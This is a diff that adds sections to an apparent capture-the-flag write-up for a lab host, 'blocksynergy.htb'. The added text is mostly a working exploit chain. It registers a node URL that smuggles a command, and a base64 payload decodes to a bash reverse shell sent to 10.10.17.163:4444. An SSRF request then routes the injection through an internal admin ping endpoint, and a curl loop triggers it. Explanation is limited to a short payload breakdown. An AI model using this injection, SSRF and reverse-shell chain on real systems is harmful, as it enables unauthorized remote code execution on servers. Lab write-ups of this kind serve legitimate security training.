@@ -80,6 +80,97 @@ curl -X POST http://blocksynergy.htb:8080/dashboard/wallet \
 
 
 
+## Registering the Malicious Node (Command Injection)
+
+```
+curl -X POST http://blocksynergy.htb:8080/dashboard/vip/nodes \
+  -H "Cookie: session=YOUR_SESSION" \
+  -d "action=register" \
+  -d "node=http://x;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjMvNDQ0NCAwPiYxJw==|base64 -d|bash;a@0.0.0.0:8080/"
+```
+
+
+
+**The Payload Breakdown:**
+
+```text
+
+http://x;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjMvNDQ0NCAwPiYxJw==|base64 -d|bash;a@0.0.0.0:8080/
+```
+
+
+|Part|Purpose|
+|---|---|
+|`http://x`|Invalid hostname (doesn't resolve)|
+|`;`|Command separator - terminates the URL parsing|
+|`echo BASE64`|Decodes and executes the reverse shell|
+|`\|base64 -d\|bash`|Decodes base64 and executes the command|
+|`;a@0.0.0.0:8080/`|Makes it look like a valid URL|
+
+**The Base64 Payload:**
+
+```text
+
+YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjMvNDQ0NCAwPiYxJw==
+```
+
+
+Decoded:
+
+```bash
+
+bash -c 'bash -i >& /dev/tcp/10.10.17.163/4444 0>&1'
+```
+
+**What happened when registering:**
+
+1. The server stored the node URL in its database
+    
+2. No validation was done on the content (vulnerability)
+    
+3. The semicolon was allowed in the URL (vulnerability)
+
+
+
+---
+
+## The SSRF Trigger 
+
+
+```
+
+curl -X POST http://blocksynergy.htb:8080/dashboard/vip/nodes \
+  -H "Cookie: session=YOUR_SESSION" \
+  -d "action=register" \
+  -d "node=http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=http%3A%2F%2Fx%3Becho%20YmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNy4xNjMvNDQ0NCAwPiYxJw%3D%3D%7Cbase64%20-d%7Cbash%3Ba%400.0.0.0%3A8080%2F"
+```
+
+
+---
+
+## Triggering the Exploit
+
+
+```
+# Triggered all nodes to make sure the exploit runs
+for i in 0 1 2 3; do
+    curl http://blocksynergy.htb:8080/dashboard/vip/nodes/test_node/$i \
+      -H "Cookie: session=YOUR_SESSION"
+done
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
